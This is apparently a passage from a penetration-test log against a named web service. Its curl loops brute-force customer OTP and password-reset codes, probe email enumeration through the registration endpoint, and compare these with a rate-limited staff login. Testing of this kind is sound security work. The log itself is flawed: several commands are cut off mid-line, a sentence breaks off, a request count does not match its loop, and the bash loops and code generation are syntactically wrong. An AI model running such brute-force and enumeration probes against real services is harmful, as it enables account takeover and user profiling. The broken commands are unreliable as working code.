--- Step 2: Brute-force probe against /api/public/customers/verify-otp (21 sequential wrong-code requests) ---
$ for i in 000000 111111 123456 999999 444444 555555; do

No HTTP 429, no lockout message, no CAPTCHA challenge, no increasing latency/backoff observed across

--- Step 3: Brute-force probe against /api/public/customers/reset-password (10 sequential wrong-code requests) ---
$ for i in 1..10; do
    CODE=printf "%06d" $((200000+i))
    curl -s -X POST https://zakerne.com/api/public/customers/reset-password \
      -H "Content-Type: application/json" \

Result (all 10 attempts): HTTP 400 {"error":"Invalid or expired code"}
Same behavior — no rate limit, no lockout, generic (non-enumerable) error message in all cases,
including when tested with a non-existent email (positive control: no user-enumeration via this
specific endpoint's error message).

--- Step 4: Email-enumeration probe against /api/public/customers/register (8 sequential requests, known-existing email) ---
$ for i in 1..8; do
    curl -s -X POST https://zakerne.com/api/public/customers/register \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"pentest-zak-1784222837@example.com\", ... \"phoneNumber\":\"+9617002217$i\", \"bookingSlug\":\"demo\"}"
  done

Result (all 8 attempts): HTTP 409 {"error":"An account with this email already exists. Please log in."}
No rate limit triggered. This response IS distinguishable from a non-existent-email registration
(which returns HTTP 200 {"success":true,...}), confirming a straightforward, unthrottled
user-enumeration oracle for customer email addresses via the registration endpoint.

--- Control/contrast test: /api/auth/login (STAFF login, different namespace) ---
$ for i in 1..6; do
    curl -s -X POST https://zakerne.com/api/auth/login \
      -H "Content-Type: application/json" \
      -d "{\"loginId\":\"admin\",\"password\":\"wrongpass$i\"}"
  done

Result: attempts 1-3 -> HTTP 400 {"error":"Login ID, email, and password are required"}
        attempts 4-6 -> HTTP 429 "error code: 1015" (Cloudflare-level rate limit block)

This CONFIRMS Cloudflare-level rate limiting/WAF protection DOES exist and IS actively enforced for
the staff-facing /api/auth/login endpoint, but the same protection is demonstrably NOT applied to the
/api/public/customers/* namespace (verify-otp, reset-password, register) despite those endpoints being
equally (arguably more) security-critical, since they gate account-takeover-relevant secrets (OTP
codes) rather than just a login password. This is strong evidence of an inconsistent/incomplete
rate-limiting policy rather than a blanket absence of capability — the control clearly exists and
works elsewhere on the same domain, it is simply not applied to this endpoint group.
